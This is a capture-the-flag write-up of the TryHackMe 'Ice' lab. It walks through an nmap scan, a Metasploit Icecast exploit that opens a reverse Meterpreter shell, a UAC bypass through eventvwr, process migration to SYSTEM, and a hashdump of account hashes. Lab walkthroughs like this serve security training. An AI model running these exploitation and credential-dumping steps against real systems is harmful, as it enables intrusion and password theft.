###### Deploy & hack into a Windows machine, exploiting a very poorly secured media server.
Room: https://tryhackme.com/room/ice
##

**sudo** nmap -sV -sS -T5 -vv xx.xx.xx.xxx   
```
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped   syn-ack ttl 127
5357/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         syn-ack ttl 127 Icecast streaming media server
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49158/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

As we can see, the media server is running on port 8000.   

After a quick look in metasploit, we have found a potentially exploit for our target.  


**search** icecast
```
Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite

```
After setting up the required options (**show options**), we hit **run** and we get a meterpreter session.  

```
[*] Started reverse TCP handler on xx.x.x.xxx:4444 
[*] Sending stage (175174 bytes) to xx.xx.xx.xxx
[*] Meterpreter session 1 opened (xx.x.x.xxx:4444 -> xx.xx.xx.xxx:49188) at 2021-10-10 20:45:13 +0300
```

meterpreter > run post/multi/recon/local_exploit_suggester 
**CTRL+Z**

**use** exploit/windows/local/bypassuac_eventvwr
* set the session to the ID of the previously opened meterpreter session, most likely 1.
* use a different port.  

```
[*] Started reverse TCP handler on xx.x.x.xxx:4445 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to xx.xx.xx.xxx
[*] Meterpreter session 2 opened (xx.x.x.xxx:4445 -> xx.xx.xx.xxx:49208) at 2021-10-10 21:00:31 +0300
[*] Cleaning up registry keys ...
```

Now, if we check our privileges using **getprivs** we see that we have some elevated privileges.   
**Privileges from the first meterpreter shell**
``` 
Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

**Privileges from the second meterpreter shell**

```
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

The **SeTakeOwnershipPrivilege** allows us to take ownership of the files on the system.  

In order to be able to exploit the **lsass** service:  
* We need to be on the same architecture as the process.
* We need to live in a process that has the same permissions as lsass.  

LSASS is the service responsible for authentication within Windows.  

If we look at the processes using **ps**: 
* We can migrate to process **spoolsv.exe** since it has the same privileges & architecture.  

```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 2656 to 1368...
[*] Migration completed successfully.
```
**meterpreter > getuid**  
> Server username: NT AUTHORITY\SYSTEM

**hashdump output**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```


